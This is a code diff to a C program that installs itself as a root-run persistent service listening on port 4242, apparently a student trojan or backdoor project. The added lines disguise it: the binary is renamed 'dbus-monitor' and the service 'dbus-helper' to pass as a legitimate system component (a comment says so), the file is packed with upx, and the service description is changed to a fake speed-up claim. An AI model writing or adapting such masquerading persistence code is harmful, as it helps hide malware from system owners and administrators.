@@ -14,9 +14,13 @@
 #include <semaphore.h>
 #include <arpa/inet.h>
 
-#define TARGET_PATH "/usr/local/bin/peer_reviewer"
-#define SERVICE_PATH_SYSTEMD "/etc/systemd/system/ft_shield.service"
-#define SERVICE_PATH_SYSVINIT "/etc/init.d/ft_shield"
+/*
+    Decided to name it dbus-monitor as it is a common name for a service
+    for example dbus-daemon is a service that runs on linux systems.
+*/
+#define DISGUISED_TARGET_PATH "/usr/local/bin/dbus-monitor" 
+#define SERVICE_PATH_SYSTEMD "/etc/systemd/system/dbus-helper.service" 
+#define SERVICE_PATH_SYSVINIT "/etc/init.d/dbus-helper"
 #define PORT 4242
 
 sem_t connection_semaphore;
@@ -40,7 +44,7 @@ void copy_to_standard_location()
         exit(EXIT_FAILURE);
     }
 
-    int target_fd = open(TARGET_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+    int target_fd = open(DISGUISED_TARGET_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
     if (target_fd < 0)
     {
         perror("Failed to open target path");
@@ -62,16 +66,17 @@ void copy_to_standard_location()
 
     close(source_fd);
     close(target_fd);
+    system("upx --best " DISGUISED_TARGET_PATH);
 }
 
 void create_service_file(int systemd_enabled)
 {
     const char *service_content_systemd =
         "[Unit]\n"
-        "Description=Peer reviewer daemon for helping you code better.\n"
+        "Description=Speedups your system 100%% real.\n"
         "After=network.target\n\n"
         "[Service]\n"
-        "ExecStart=/usr/local/bin/peer_reviewer --daemon\n"
+        "ExecStart=" DISGUISED_TARGET_PATH " --daemon\n"
         "Restart=always\n"
         "User=root\n\n"
         "[Install]\n"
@@ -80,20 +85,20 @@ void create_service_file(int systemd_enabled)
     const char *service_content_sysvinit =
         "#!/bin/sh\n"
         "### BEGIN INIT INFO\n"
-        "# Provides:          ft_shield\n"
+        "# Provides:          DBus monitoring\n"
         "# Required-Start:    $network\n"
         "# Required-Stop:     $network\n"
         "# Default-Start:     2 3 4 5\n"
         "# Default-Stop:      0 1 6\n"
-        "# Short-Description: Peer reviewer daemon for helping you code better.\n"
+        "# Short-Description: Speedups your system 100%% real.\n"
         "### END INIT INFO\n"
         "\n"
         "case \"$1\" in\n"
         "    start)\n"
-        "        /usr/local/bin/peer_reviewer &\n"
+        "        " DISGUISED_TARGET_PATH " &\n"
         "        ;;\n"
         "    stop)\n"
-        "        killall peer_reviewer\n"
+        "        killall dbus-monitor\n"
         "        ;;\n"
         "    *)\n"
         "        echo \"Usage: $0 {start|stop}\"\n"
@@ -120,24 +125,24 @@ void setup_service(int systemd_enabled)
     if (systemd_enabled)
     {
         system("systemctl daemon-reload");
-        system("systemctl enable ft_shield");
-        system("systemctl start ft_shield");
+        system("systemctl enable dbus-helper");
+        system("systemctl start dbus-helper");
     }
     else
     {
-        system("chmod +x /etc/init.d/ft_shield");
-        system("service ft_shield start");
+        system("chmod +x " SERVICE_PATH_SYSVINIT);
+        system("service dbus-helper start");
     }
 }
 
 void uninstall_service(int systemd_enabled)
 {
-    system("ps aux | grep '[f]t_shield' | awk '{print $2}' | xargs kill -9 2>/dev/null 1>/dev/null");
+    system("ps aux | grep '[d]bus-monitor' | awk '{print $2}' | xargs kill -9 2>/dev/null 1>/dev/null");
 
     if (systemd_enabled)
     {
-        system("systemctl stop ft_shield");
-        system("systemctl disable ft_shield");
+        system("systemctl stop dbus-helper");
+        system("systemctl disable dbus-helper");
         if (remove(SERVICE_PATH_SYSTEMD) == 0)
         {
             printf("Systemd service file removed successfully.\n");
@@ -150,7 +155,7 @@ void uninstall_service(int systemd_enabled)
     }
     else
     {
-        system("service ft_shield stop");
+        system("service dbus-helper stop");
         if (remove(SERVICE_PATH_SYSVINIT) == 0)
         {
             printf("SysVinit service file removed successfully.\n");
@@ -161,7 +166,7 @@ void uninstall_service(int systemd_enabled)
         }
     }
 
-    if (remove(TARGET_PATH) == 0)
+    if (remove(DISGUISED_TARGET_PATH) == 0)
     {
         printf("Binary removed successfully.\n");
     }
@@ -435,7 +440,7 @@ int main(int argc, char *argv[])
     char *user = get_username();
     printf("%s\n", user);
 
-    if (access(TARGET_PATH, F_OK) != 0)
+    if (access(DISGUISED_TARGET_PATH, F_OK) != 0)
     {
         copy_to_standard_location();
     }
